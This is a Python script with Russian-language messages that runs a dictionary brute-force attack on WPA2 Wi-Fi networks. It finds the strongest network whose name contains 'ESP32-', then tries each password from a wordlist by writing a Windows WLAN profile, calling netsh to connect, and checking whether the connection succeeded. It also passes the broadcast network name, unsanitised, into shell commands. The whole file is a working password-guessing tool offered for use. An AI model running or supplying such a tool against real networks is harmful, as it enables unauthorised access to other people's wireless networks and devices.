import subprocess
import time

PASSWORD_FILE = "passwords.txt"
XML_PATH = "wifi-profile.xml"


def find_wifi():
    try:
        result = subprocess.check_output(
            'netsh wlan show networks mode=bssid', shell=True, text=True, encoding='cp866', errors='ignore'
        )
    except subprocess.CalledProcessError:
        print("Ошибка при получении списка Wi-Fi сетей.")
        return None

    best_wifi = None
    best_signal = 0
    wifi = None

    for line in result.split("\n"):
        line = line.strip()

        if "SSID" in line and "ESP32-" in line:
            parts = line.split(":")
            if len(parts) > 1:
                wifi = parts[1].strip()
            else:
                continue

        if wifi and "Сигнал" in line:
            try:
                signal = int(line.split(":")[1].strip().replace("%", ""))
                if signal > best_signal:
                    best_signal = signal
                    best_wifi = wifi
            except ValueError:
                continue

    if best_wifi:
        print(f"Найдена сеть: {best_wifi} с сигналом {best_signal}%")
    else:
        print("Сеть ESP32-XXX не найдена.")

    return best_wifi


def create_wifi_profile(name, password, path):
    profile = f'''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{name}</name>
    <SSIDConfig>
        <SSID>
            <name>{name}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>manual</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>'''

    with open(path, 'w', encoding='utf-8') as file:
        file.write(profile)


def is_connected(target_wifi):
    try:
        result = subprocess.check_output(
            'netsh wlan show interfaces', shell=True, text=True, encoding='cp866', errors='ignore'
        )
    except subprocess.CalledProcessError:
        print("Ошибка при проверке подключения.")
        return False

    result = result.lower()
    return "состояние" in result and "подключено" in result and target_wifi.lower() in result


def brute_force_wifi():
    with open(PASSWORD_FILE, 'r', encoding='utf-8') as file:
        passwords = [line.strip() for line in file]

    for password in passwords:
        WIFI_NAME = find_wifi()
        if not WIFI_NAME:
            print("Ждем 10 секунд и повторяем...")
            time.sleep(10)
            continue

        print(f"Пробуем пароль: {password} для сети {WIFI_NAME}")

        create_wifi_profile(WIFI_NAME, password, XML_PATH)

        subprocess.run(f'netsh wlan add profile filename="{XML_PATH}"', shell=True, stdout=subprocess.DEVNULL)
        connect_result = subprocess.run(f'netsh wlan connect name="{WIFI_NAME}"', shell=True, stdout=subprocess.DEVNULL)

        if connect_result.returncode != 0:
            print(f"Ошибка подключения к {WIFI_NAME}. Пропускаем...")
            continue

        time.sleep(5)

        if is_connected(WIFI_NAME):
            print(f"Пароль найден: {password}")
            break
        else:
            print("Неправильный пароль")


if __name__ == "__main__":
    brute_force_wifi()
